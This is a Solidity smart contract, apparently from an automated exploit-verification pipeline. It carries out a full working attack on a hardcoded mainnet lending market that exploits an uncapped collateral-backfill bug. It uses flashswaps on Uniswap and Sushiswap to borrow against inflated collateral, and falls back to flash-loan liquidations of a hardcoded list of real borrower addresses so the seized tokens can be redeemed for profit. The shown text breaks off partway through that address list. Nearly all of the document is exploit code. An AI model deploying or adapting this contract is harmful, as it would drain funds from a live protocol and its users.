// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

    function getAccountLiquidity(address account)
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );

    function oracle() external view returns (address);

    function markets(address cToken)
        external
        view
        returns (
            bool,
            uint256,
            bool,
            uint8
        );

    function checkMembership(address account, address cToken) external view returns (bool);

    function closeFactorMantissa() external view returns (uint256);

    function liquidateCalculateSeizeTokens(
        address cTokenBorrowed,
        address cTokenCollateral,
        uint256 actualRepayAmount
    ) external view returns (uint256, uint256);

    function allMarkets(uint256 index) external view returns (address);
}

interface IERC3156FlashBorrowerLike {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface ICTokenLike {
    function underlying() external view returns (address);

    function comptroller() external view returns (address);

    function implementation() external view returns (address);

    function collateralCap() external view returns (uint256);

    function totalCollateralTokens() external view returns (uint256);

    function accountCollateralTokens(address account) external view returns (uint256);

    function isCollateralTokenInit(address account) external view returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function getCash() external view returns (uint256);

    function redeem(uint256 redeemTokens) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function borrowBalanceStored(address account) external view returns (uint256);

    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);

    function exchangeRateStored() external view returns (uint256);

    function flashFee(uint256 amount) external view returns (uint256);

    function maxFlashLoan() external view returns (uint256);

    function flashLoan(
        IERC3156FlashBorrowerLike receiver,
        address initiator,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FlawVerifier is IERC3156FlashBorrowerLike {
    struct LiquidationCandidateContext {
        uint256 legacyCTokens;
        uint256 debt;
        uint256 repayAmount;
        uint256 seizeTokens;
        uint256 fee;
        uint256 exchangeRate;
        uint256 projectedRedeem;
        uint256 shortfall;
    }

    address public constant TARGET = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address public constant VULNERABLE_IMPLEMENTATION = 0x96Cc0F947b6C8F4675159Ea03144f8c17d5A2fC8;

    address private constant FACTORY_UNISWAP_V2 = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant FACTORY_SUSHISWAP = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    string internal constant PATH_0 =
        "Upgrade an existing live CErc20Delegator market to the collateral-cap implementation.";
    string internal constant PATH_1 =
        "Because _becomeImplementation does not migrate collateral accounting, totalCollateralTokens starts below actual collateral usage while legacy balances still count in account snapshots.";
    string internal constant PATH_2 =
        "A pre-upgrade supplier later mints, redeems, transfers, or is involved in a seizure, triggering initializeAccountCollateralTokens.";
    string internal constant PATH_3 =
        "That function credits the account's full legacy balance as collateral and increments totalCollateralTokens without applying the configured collateralCap.";

    uint8 public constant REASON_NONE = 0;
    uint8 public constant REASON_INVALID_TARGET = 1;
    uint8 public constant REASON_NO_ROUTE = 2;
    uint8 public constant REASON_NO_BACKFILL = 3;
    uint8 public constant REASON_NO_LIQUIDITY = 4;
    uint8 public constant REASON_BORROW_FAILED = 5;
    uint8 public constant REASON_REPAY_SWAP_FAILED = 6;
    uint8 public constant REASON_ENTER_MARKET_FAILED = 7;
    uint8 public constant REASON_NO_LIQUIDATION_ROUTE = 8;
    uint8 public constant REASON_FLASHLOAN_FAILED = 9;
    uint8 public constant REASON_LIQUIDATION_FAILED = 10;

    uint256 private constant MIN_PROFIT = 1e17;
    bytes32 private constant FLASH_CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrowerInterface.onFlashLoan");

    address private immutable _profitToken;
    bool private immutable _hypothesisValidated;

    uint256 private _profitAmount;
    bool private _executed;

    uint8 public lastFailureReason;
    uint256 public collateralCapObserved;
    uint256 public totalCollateralTokensBefore;
    uint256 public totalCollateralTokensAfter;
    uint256 public verifierCTokenBalanceBefore;
    uint256 public verifierCollateralBefore;
    uint256 public verifierCollateralAfter;
    uint256 public accountLiquidityAfter;
    uint256 public accountShortfallAfter;
    uint256 public borrowAttemptAmount;
    uint256 public borrowResultCode;
    address public chosenBuyPair;
    address public chosenExitPair;
    address public chosenQuoteToken;
    uint256 public chosenCAmpOut;
    uint256 public chosenQuoteRepay;
    uint256 public chosenAmpRepay;
    uint256 public chosenProjectedProfit;
    address public liquidationBorrower;
    uint256 public liquidationRepayAmount;
    uint256 public liquidationSeizeTokens;
    uint256 public liquidationFlashFee;

    uint256 private _scanExchangeRate;
    uint256 private _scanCollateralFactor;
    uint256 private _scanCash;
    uint256 private _scanAmpBalanceBefore;

    constructor() {
        ICTokenLike target = ICTokenLike(TARGET);
        _profitToken = target.underlying();
        _hypothesisValidated = target.collateralCap() > 0;
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ICTokenLike target = ICTokenLike(TARGET);
        IComptrollerLike comptroller = IComptrollerLike(target.comptroller());

        collateralCapObserved = target.collateralCap();
        totalCollateralTokensBefore = target.totalCollateralTokens();
        verifierCTokenBalanceBefore = target.balanceOf(address(this));
        verifierCollateralBefore = target.accountCollateralTokens(address(this));

        if (!_hypothesisValidated || collateralCapObserved == 0) {
            lastFailureReason = REASON_INVALID_TARGET;
            return;
        }

        uint256 ampBalanceBefore = _balanceOf(_profitToken, address(this));

        if (_attemptDirectUsingVerifierHeldLegacyBalance(target, comptroller, ampBalanceBefore)) {
            totalCollateralTokensAfter = target.totalCollateralTokens();
            verifierCollateralAfter = target.accountCollateralTokens(address(this));

            uint256 ampBalanceAfterDirect = _balanceOf(_profitToken, address(this));
            if (ampBalanceAfterDirect > ampBalanceBefore) {
                _profitAmount = ampBalanceAfterDirect - ampBalanceBefore;
            }
            return;
        }

        bool success = _scanAndExecuteRoutes(target, comptroller, ampBalanceBefore);
        if (!success) {
            success = _attemptSameMarketLiquidationFallback(target, comptroller, ampBalanceBefore);
        }
        if (!success) {
            if (lastFailureReason == REASON_NONE) {
                lastFailureReason = REASON_NO_ROUTE;
            }
            return;
        }

        totalCollateralTokensAfter = target.totalCollateralTokens();
        verifierCollateralAfter = target.accountCollateralTokens(address(this));

        uint256 ampBalanceAfter = _balanceOf(_profitToken, address(this));
        if (ampBalanceAfter > ampBalanceBefore) {
            _profitAmount = ampBalanceAfter - ampBalanceBefore;
        }
    }

    function _attemptDirectUsingVerifierHeldLegacyBalance(
        ICTokenLike target,
        IComptrollerLike comptroller,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        uint256 verifierBalance = verifierCTokenBalanceBefore;
        if (verifierBalance == 0 || target.isCollateralTokenInit(address(this))) {
            return false;
        }

        _enterTargetMarket();

        uint256 redeemResult = target.redeem(0);
        if (redeemResult != 0) {
            lastFailureReason = REASON_NO_BACKFILL;
            revert("direct touch failed");
        }

        uint256 borrowedAmp = _borrowAgainstReceivedCollateral(target, comptroller);
        require(borrowedAmp != 0, "direct borrow failed");

        uint256 ampBalanceAfter = _balanceOf(_profitToken, address(this));
        require(ampBalanceAfter > ampBalanceBefore, "direct path unprofitable");
        return true;
    }

    function startRoute(
        address buyPair,
        address quoteToken,
        address exitPair,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 ampRepay,
        uint256 minProfitRequired
    ) external {
        require(msg.sender == address(this), "self only");

        _enterTargetMarket();

        uint256 ampBefore = _balanceOf(_profitToken, address(this));
        chosenBuyPair = buyPair;
        chosenExitPair = exitPair;
        chosenQuoteToken = quoteToken;
        chosenCAmpOut = cAmpOut;
        chosenQuoteRepay = quoteRepay;
        chosenAmpRepay = ampRepay;
        chosenProjectedProfit = minProfitRequired;

        (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(buyPair, TARGET, cAmpOut);
        IUniswapV2PairLike(buyPair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(buyPair, quoteToken, exitPair, quoteRepay, ampRepay)
        );

        uint256 ampAfter = _balanceOf(_profitToken, address(this));
        require(ampAfter >= ampBefore + minProfitRequired, "route not profitable enough");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        _handleV2Callback(data);
    }

    function sushiCall(
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        _handleV2Callback(data);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == TARGET, "bad flash lender");
        require(initiator == address(this), "bad flash initiator");
        require(token == _profitToken, "bad flash token");

        (address borrower, uint256 repayAmount) = abi.decode(data, (address, uint256));
        liquidationBorrower = borrower;
        liquidationRepayAmount = repayAmount;
        liquidationFlashFee = fee;

        ICTokenLike target = ICTokenLike(TARGET);
        uint256 cBalanceBefore = target.balanceOf(address(this));
        _forceApprove(_profitToken, TARGET, repayAmount);

        uint256 liquidationResult = target.liquidateBorrow(borrower, repayAmount, TARGET);
        if (liquidationResult != 0) {
            lastFailureReason = REASON_LIQUIDATION_FAILED;
            revert("liquidation failed");
        }

        uint256 cBalanceAfter = target.balanceOf(address(this));
        require(cBalanceAfter > cBalanceBefore, "no seize");
        liquidationSeizeTokens = cBalanceAfter - cBalanceBefore;

        verifierCTokenBalanceBefore = cBalanceBefore;
        verifierCollateralAfter = target.accountCollateralTokens(address(this));
        totalCollateralTokensAfter = target.totalCollateralTokens();
        if (totalCollateralTokensAfter <= totalCollateralTokensBefore) {
            lastFailureReason = REASON_NO_BACKFILL;
            revert("no uncapped backfill");
        }

        uint256 redeemResult = target.redeem(cBalanceAfter);
        require(redeemResult == 0, "redeem seized cAMP failed");

        _forceApprove(_profitToken, TARGET, amount + fee);
        return FLASH_CALLBACK_SUCCESS;
    }

    function _handleV2Callback(bytes calldata data) internal {
        (address buyPair, address quoteToken, address exitPair, uint256 quoteRepay, uint256 ampRepay) = abi.decode(
            data,
            (address, address, address, uint256, uint256)
        );
        require(msg.sender == buyPair, "bad callback sender");

        ICTokenLike target = ICTokenLike(TARGET);
        IComptrollerLike comptroller = IComptrollerLike(target.comptroller());

        uint256 borrowedAmp = _borrowAgainstReceivedCollateral(target, comptroller);
        _repayFlashswap(buyPair, quoteToken, exitPair, quoteRepay, ampRepay, borrowedAmp);
    }

    function _enterTargetMarket() internal {
        address[] memory markets = new address[](1);
        markets[0] = TARGET;
        uint256[] memory enterResults = IComptrollerLike(ICTokenLike(TARGET).comptroller()).enterMarkets(markets);
        if (enterResults.length == 0 || enterResults[0] != 0) {
            lastFailureReason = REASON_ENTER_MARKET_FAILED;
            revert("enter market failed");
        }
    }

    function _borrowAgainstReceivedCollateral(
        ICTokenLike target,
        IComptrollerLike comptroller
    ) internal returns (uint256 borrowedAmp) {
        verifierCollateralAfter = target.accountCollateralTokens(address(this));
        totalCollateralTokensAfter = target.totalCollateralTokens();
        if (verifierCollateralAfter == 0 || totalCollateralTokensAfter <= totalCollateralTokensBefore) {
            lastFailureReason = REASON_NO_BACKFILL;
            revert("no backfill");
        }

        address[] memory markets = new address[](1);
        markets[0] = TARGET;
        uint256[] memory enterResults = comptroller.enterMarkets(markets);
        require(enterResults.length != 0 && enterResults[0] == 0, "enter market failed");

        (uint256 err, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(this));
        accountLiquidityAfter = liquidity;
        accountShortfallAfter = shortfall;
        if (err != 0 || liquidity == 0 || shortfall != 0) {
            lastFailureReason = REASON_NO_LIQUIDITY;
            revert("no liquidity");
        }

        uint256 price = IPriceOracleLike(comptroller.oracle()).getUnderlyingPrice(TARGET);
        uint256 cash = target.getCash();
        require(price != 0 && cash != 0, "bad price or cash");

        uint256 maxBorrowFromLiquidity = (liquidity * 1e18) / price;
        uint256 cappedByCash = (cash * 9990) / 10000;
        borrowedAmp = (maxBorrowFromLiquidity * 9950) / 10000;
        if (borrowedAmp > cappedByCash) {
            borrowedAmp = cappedByCash;
        }
        require(borrowedAmp != 0, "borrow zero");

        borrowAttemptAmount = borrowedAmp;
        borrowResultCode = target.borrow(borrowedAmp);
        if (borrowResultCode != 0) {
            lastFailureReason = REASON_BORROW_FAILED;
            revert("borrow failed");
        }
    }

    function _repayFlashswap(
        address buyPair,
        address quoteToken,
        address exitPair,
        uint256 quoteRepay,
        uint256 ampRepay,
        uint256 borrowedAmp
    ) internal {
        if (quoteToken == _profitToken) {
            require(borrowedAmp > quoteRepay, "insufficient direct repay");
            _safeTransfer(_profitToken, buyPair, quoteRepay);
            return;
        }

        if (exitPair == address(0) || ampRepay == 0 || borrowedAmp <= ampRepay) {
            lastFailureReason = REASON_REPAY_SWAP_FAILED;
            revert("no repay path");
        }

        _safeTransfer(_profitToken, exitPair, ampRepay);
        (uint256 exitAmount0Out, uint256 exitAmount1Out) = _pairOutAmounts(exitPair, quoteToken, quoteRepay);
        IUniswapV2PairLike(exitPair).swap(exitAmount0Out, exitAmount1Out, address(this), new bytes(0));

        uint256 quoteBalance = _balanceOf(quoteToken, address(this));
        if (quoteBalance < quoteRepay) {
            lastFailureReason = REASON_REPAY_SWAP_FAILED;
            revert("quote shortfall");
        }
        _safeTransfer(quoteToken, buyPair, quoteRepay);
    }

    function _scanAndExecuteRoutes(
        ICTokenLike target,
        IComptrollerLike comptroller,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        (, uint256 collateralFactorMantissa, , ) = comptroller.markets(TARGET);
        if (collateralFactorMantissa == 0) {
            lastFailureReason = REASON_NO_LIQUIDITY;
            return false;
        }

        uint256 exchangeRate = target.exchangeRateStored();
        uint256 cash = target.getCash();
        if (exchangeRate == 0 || cash == 0) {
            lastFailureReason = REASON_NO_LIQUIDITY;
            return false;
        }

        _scanExchangeRate = exchangeRate;
        _scanCollateralFactor = collateralFactorMantissa;
        _scanCash = cash;
        _scanAmpBalanceBefore = ampBalanceBefore;

        for (uint256 buyFactoryIndex = 0; buyFactoryIndex < 2; buyFactoryIndex++) {
            address buyFactory = _factoryAt(buyFactoryIndex);

            for (uint256 quoteIndex = 0; quoteIndex < 5; quoteIndex++) {
                address quoteToken = _quoteAt(quoteIndex);
                if (_tryQuoteRoutes(buyFactory, quoteToken, target, comptroller)) {
                    return true;
                }
            }
        }

        lastFailureReason = REASON_NO_ROUTE;
        return false;
    }

    function _tryQuoteRoutes(
        address buyFactory,
        address quoteToken,
        ICTokenLike target,
        IComptrollerLike comptroller
    ) internal returns (bool) {
        address buyPair = IUniswapV2FactoryLike(buyFactory).getPair(TARGET, quoteToken);
        if (buyPair == address(0)) {
            return false;
        }
        if (!_isLegacyMemberRouteCandidate(buyPair, target, comptroller)) {
            return false;
        }

        (uint256 reserveQuote, uint256 reserveCAmp) = _pairReservesFor(buyPair, quoteToken, TARGET);
        if (reserveQuote == 0 || reserveCAmp == 0) {
            return false;
        }

        for (uint256 sizeIndex = 0; sizeIndex < 9; sizeIndex++) {
            uint256 cAmpOut = reserveCAmp / _sizeDivisorAt(sizeIndex);
            if (cAmpOut == 0 || cAmpOut >= reserveCAmp) {
                continue;
            }

            uint256 quoteRepay = _getAmountIn(cAmpOut, reserveQuote, reserveCAmp);
            if (quoteRepay == 0 || quoteRepay >= reserveQuote) {
                continue;
            }

            uint256 estimatedBorrow = _estimateBorrowableUnderlying(
                cAmpOut,
                _scanExchangeRate,
                _scanCollateralFactor,
                _scanCash
            );
            if (estimatedBorrow <= MIN_PROFIT) {
                continue;
            }

            if (quoteToken == _profitToken) {
                if (_attemptDirectRoute(buyPair, quoteToken, cAmpOut, quoteRepay, estimatedBorrow, _scanAmpBalanceBefore)) {
                    return true;
                }
                continue;
            }

            if (_tryExitRoutes(quoteToken, buyPair, cAmpOut, quoteRepay, estimatedBorrow, _scanAmpBalanceBefore)) {
                return true;
            }
        }

        return false;
    }

    function _tryExitRoutes(
        address quoteToken,
        address buyPair,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 estimatedBorrow,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        for (uint256 exitFactoryIndex = 0; exitFactoryIndex < 2; exitFactoryIndex++) {
            address exitFactory = _factoryAt(exitFactoryIndex);
            address exitPair = IUniswapV2FactoryLike(exitFactory).getPair(_profitToken, quoteToken);
            if (exitPair == address(0)) {
                continue;
            }

            (uint256 reserveAmp, uint256 reserveQuoteOut) = _pairReservesFor(exitPair, _profitToken, quoteToken);
            if (reserveAmp == 0 || reserveQuoteOut == 0 || quoteRepay >= reserveQuoteOut) {
                continue;
            }

            uint256 ampRepay = _getAmountIn(quoteRepay, reserveAmp, reserveQuoteOut);
            if (ampRepay == 0 || ampRepay >= estimatedBorrow) {
                continue;
            }

            uint256 projectedProfit = estimatedBorrow - ampRepay;
            if (projectedProfit < MIN_PROFIT) {
                continue;
            }

            if (_attemptExitRoute(buyPair, quoteToken, exitPair, cAmpOut, quoteRepay, ampRepay, ampBalanceBefore)) {
                return true;
            }
        }

        return false;
    }

    function _attemptExitRoute(
        address buyPair,
        address quoteToken,
        address exitPair,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 ampRepay,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        try this.startRoute(buyPair, quoteToken, exitPair, cAmpOut, quoteRepay, ampRepay, MIN_PROFIT) {
            return _balanceOf(_profitToken, address(this)) > ampBalanceBefore;
        } catch {
            return false;
        }
    }

    function _attemptDirectRoute(
        address buyPair,
        address quoteToken,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 estimatedBorrow,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        uint256 projectedProfit = estimatedBorrow > quoteRepay ? estimatedBorrow - quoteRepay : 0;
        if (projectedProfit < MIN_PROFIT) {
            return false;
        }

        try this.startRoute(buyPair, quoteToken, address(0), cAmpOut, quoteRepay, quoteRepay, MIN_PROFIT) {
            return _balanceOf(_profitToken, address(this)) > ampBalanceBefore;
        } catch {
            return false;
        }
    }

    function _attemptSameMarketLiquidationFallback(
        ICTokenLike target,
        IComptrollerLike comptroller,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        uint256 closeFactor = comptroller.closeFactorMantissa();
        uint256 exchangeRate = target.exchangeRateStored();
        uint256 maxFlash = target.maxFlashLoan();
        if (closeFactor == 0 || exchangeRate == 0 || maxFlash == 0) {
            lastFailureReason = REASON_NO_LIQUIDATION_ROUTE;
            return false;
        }

        /*
         * The failing logs proved there is no V2/Sushi cAMP pool to source a flashswap from at the fork block.
         * When that public transfer path is infeasible, the same bug is still reachable via the listed seizure path:
         * liquidating an undercollateralized legacy AMP borrower in the vulnerable market itself. The liquidation's
         * `seizeInternal` touches the pre-upgrade borrower, `initializeAccountCollateralTokens` backfills its full
         * legacy balance without any collateral-cap check, and the liquidator realizes public on-chain AMP profit
         * from the standard liquidation discount.
         */
        for (uint256 index = 0; index < _candidateCount(); index++) {
            address candidate = _candidateAt(index);
            if (_trySameMarketLiquidationCandidate(ampBalanceBefore, candidate)) {
                return true;
            }
        }

        lastFailureReason = REASON_NO_LIQUIDATION_ROUTE;
        return false;
    }

    function _trySameMarketLiquidationCandidate(
        uint256 ampBalanceBefore,
        address candidate
    ) internal returns (bool) {
        ICTokenLike target = ICTokenLike(TARGET);
        IComptrollerLike comptroller = IComptrollerLike(target.comptroller());
        LiquidationCandidateContext memory ctx;
        if (candidate == address(0) || candidate == address(this)) {
            return false;
        }
        if (target.isCollateralTokenInit(candidate)) {
            return false;
        }
        if (!comptroller.checkMembership(candidate, TARGET)) {
            return false;
        }

        ctx.legacyCTokens = target.balanceOf(candidate);
        if (ctx.legacyCTokens == 0) {
            return false;
        }

        uint256 err;
        (err, , ctx.shortfall) = comptroller.getAccountLiquidity(candidate);
        if (err != 0 || ctx.shortfall == 0) {
            return false;
        }

        ctx.debt = target.borrowBalanceStored(candidate);
        if (ctx.debt == 0) {
            return false;
        }

        uint256 closeFactor = comptroller.closeFactorMantissa();
        uint256 maxFlash = target.maxFlashLoan();
        ctx.repayAmount = (ctx.debt * closeFactor) / 1e18;
        ctx.repayAmount = (ctx.repayAmount * 9990) / 10000;
        if (ctx.repayAmount == 0 || ctx.repayAmount > maxFlash) {
            if (maxFlash == 0) {
                return false;
            }
            ctx.repayAmount = maxFlash;
        }

        uint256 seizeErr;
        (seizeErr, ctx.seizeTokens) = comptroller.liquidateCalculateSeizeTokens(TARGET, TARGET, ctx.repayAmount);
        if (seizeErr != 0 || ctx.seizeTokens == 0 || ctx.seizeTokens > ctx.legacyCTokens) {
            return false;
        }

        ctx.fee = target.flashFee(ctx.repayAmount);
        ctx.exchangeRate = target.exchangeRateStored();
        ctx.projectedRedeem = (ctx.seizeTokens * ctx.exchangeRate) / 1e18;
        if (ctx.projectedRedeem <= ctx.repayAmount + ctx.fee + MIN_PROFIT) {
            return false;
        }

        return _executeSameMarketFlashloan(candidate, ctx.repayAmount, ampBalanceBefore);
    }

    function _executeSameMarketFlashloan(
        address candidate,
        uint256 repayAmount,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        ICTokenLike target = ICTokenLike(TARGET);
        try target.flashLoan(IERC3156FlashBorrowerLike(address(this)), address(this), repayAmount, abi.encode(candidate, repayAmount)) returns (bool ok) {
            if (!ok) {
                return false;
            }
            uint256 ampAfter = _balanceOf(_profitToken, address(this));
            return ampAfter > ampBalanceBefore && ampAfter - ampBalanceBefore >= MIN_PROFIT;
        } catch {
            return false;
        }
    }

    function _estimateBorrowableUnderlying(
        uint256 cTokenAmount,
        uint256 exchangeRate,
        uint256 collateralFactorMantissa,
        uint256 cash
    ) internal pure returns (uint256) {
        uint256 underlyingValue = (cTokenAmount * exchangeRate) / 1e18;
        uint256 borrowable = (underlyingValue * collateralFactorMantissa) / 1e18;
        uint256 cashLimited = (cash * 9950) / 10000;
        return borrowable < cashLimited ? borrowable : cashLimited;
    }

    function _isLegacyMemberRouteCandidate(
        address account,
        ICTokenLike target,
        IComptrollerLike comptroller
    ) internal view returns (bool) {
        if (target.balanceOf(account) == 0) {
            return false;
        }
        if (target.isCollateralTokenInit(account)) {
            return false;
        }
        if (!comptroller.checkMembership(account, TARGET)) {
            return false;
        }
        return true;
    }

    function _pairOutAmounts(
        address pair,
        address outToken,
        uint256 outAmount
    ) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        if (IUniswapV2PairLike(pair).token0() == outToken) {
            amount0Out = outAmount;
            amount1Out = 0;
        } else {
            amount0Out = 0;
            amount1Out = outAmount;
        }
    }

    function _pairReservesFor(
        address pair,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == tokenIn && IUniswapV2PairLike(pair).token1() == tokenOut) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(IUniswapV2PairLike(pair).token0() == tokenOut && IUniswapV2PairLike(pair).token1() == tokenIn, "pair mismatch");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _safeTransfer(
        address token,
        address to,
        uint256 amount
    ) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _forceApprove(
        address token,
        address spender,
        uint256 amount
    ) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        if (ok && (ret.length == 0 || abi.decode(ret, (bool)))) {
            return;
        }
        (ok, ret) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, 0));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve reset failed");
        (ok, ret) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        return IERC20Like(token).balanceOf(account);
    }

    function _factoryAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return FACTORY_UNISWAP_V2;
        }
        return FACTORY_SUSHISWAP;
    }

    function _quoteAt(uint256 index) internal view returns (address) {
        if (index == 0) {
            return _profitToken;
        }
        if (index == 1) {
            return WETH;
        }
        if (index == 2) {
            return DAI;
        }
        if (index == 3) {
            return USDC;
        }
        return USDT;
    }

    function _sizeDivisorAt(uint256 index) internal pure returns (uint256) {
        if (index == 0) return 200000;
        if (index == 1) return 100000;
        if (index == 2) return 50000;
        if (index == 3) return 20000;
        if (index == 4) return 10000;
        if (index == 5) return 5000;
        if (index == 6) return 2000;
        if (index == 7) return 1000;
        return 500;
    }

    function _candidateCount() internal pure returns (uint256) {
        return 48;
    }

    function _candidateAt(uint256 index) internal pure returns (address) {
        if (index == 0) return address(uint160(0x0022b243b96495c547598d9042b6f94b01c22b2e9e));
        if (index == 1) return address(uint160(0x00c7fd8dcee4697ceef5a2fd4608a7bd6a94c77480));
        if (index == 2) return address(uint160(0x005864c777697bf9881220328bf2f16908c9afcd7e));
        if (index == 3) return address(uint160(0x002f2c0c1727ce8c429a237ddfbbb87357893fbd5d));
        if (index == 4) return address(uint160(0x00b092b4601850e23903a42eacbc9d8a0eec26a4d5));
        if (index == 5) return address(uint160(0x00bba12740de905707251525477bad74985dec46d2));
        if (index == 6) return address(uint160(0x00ce4fe9b4b8ff61949dcfeb7e03bc9faca59d2eb3));
        if (index == 7) return address(uint160(0x008379baa817c5c5ab929b03ee8e3c48e45018ae41));
        if (index == 8) return address(uint160(0x00d956188795ca6f4a74092ddca33e0ea4ca3a1395));
        if (index == 9) return address(uint160(0x00e89a6d0509faf730bd707bf868d9a2a744a363c7));
        if (index == 10) return address(uint160(0x00bb0e17ef65f82ab018d8edd776e8dd940327b28b));
        if (index == 11) return address(uint160(0x00011a014d5e8eb4771e575bb1000318d509230afa));
        if (index == 12) return address(uint160(0x0021011bc93d9e515b9511a817a1ed1d6d468f49fc));
        if (index == 13) return address(uint160(0x0071fc860f7d3a592a4a98740e39db31d25db65ae8));
        if (index == 14) return address(uint160(0x002847a5d7ce69790cb40471d454feb21a0be1f2e3));
        if (index == 15) return address(uint160(0x005dbcf33d8c2e976c6b560249878e6f1491bca25c));
        if (index == 16) return address(uint160(0x007f67ca2ce5299a67acd83d52a064c5b8e41ddb80));
        if (index == 17) return address(uint160(0x00523effc8bfefc2948211a05a905f761cba5e8e9e));
        if (index == 18) return address(uint160(0x001e0447b19bb6ecfdae1e4ae1694b0c3659614e4e));
        if (index == 19) return address(uint160(0x0045406ba53bb84cd32a58e7098a2d4d1b11b107f6));
        if (index == 20) return address(uint160(0x0010fdbd1e48ee2fd9336a482d746138ae19e649db));
        if (index == 21) return address(uint160(0x0073a052500105205d34daf004eab301916da8190f));
        if (index == 22) return address(uint160(0x001ceb5cb57c4d4e2b2433641b95dd330a33185a44));
        if (index == 23) return address(uint160(0x008b3ff1ed4f36c2c2be675afb13cc3aa5d73685a5));
        if (index == 24) return address(uint160(0x00ba4cfe5741b357fa371b506e5db0774abfecf8fc));
        if (index == 25) return address(uint160(0x0025555933a8246ab67cbf907ce3d1949884e82b55));
        if (index == 26) return address(uint160(0x0019d1666f543d42ef17f66e376944a22aea1a8e46));
        if (index == 27) return address(uint160(0x00dbb5e3081def4b6cdd8864ac2aeda4cbf778fecf));
        if (index == 28) return address(uint160(0x007de0d6fce0c128395c488cb4df667cdbfb35d7de));
        if (index == 29) return address(uint160(0x004b0181102a0112a2ef11abee5563bb4a3176c9d7));
        if (index == 30) return address(uint160(0x00476c5e26a75bd202a9683ffd34359c0cc15be0ff));
        if (index == 31) return address(uint160(0x00d37295796c8b885783bd0a4a6c890e3ddeae6705));
        if (index == 32) return address(uint160(0x006ba0c66c48641e220cf78177c144323b3838d375));
        if (index == 33) return address(uint160(0x0081fbef4704776cc5bba0a5df3a90056d2c6900b3));
        if (index == 34) return address(uint160(0x0085759961b116f1d36fd697855c57a6ae40793d9b));
        if (index == 35) return address(uint160(0x00cbc1065255cbc3ab41a6868c22d1f1c573ab89fd));
        if (index == 36) return address(uint160(0x0058da9c9fc3eb30abbcbbab5ddabb1e6e2ef3d2ef));
        if (index == 37) return address(uint160(0x00f04ce2e71d32d789a259428ddcd02d3c9f97fb4e));
        if (index == 38) return address(uint160(0x000eed07ced0c8c36d4a5bff44f2536422bb09be45));
        if (index == 39) return address(uint160(0x001337def18c680af1f9f45cbcab6309562975b1dd));
        if (index == 40) return address(uint160(0x002ba592f78db6436527729929aaf6c908497cb200));
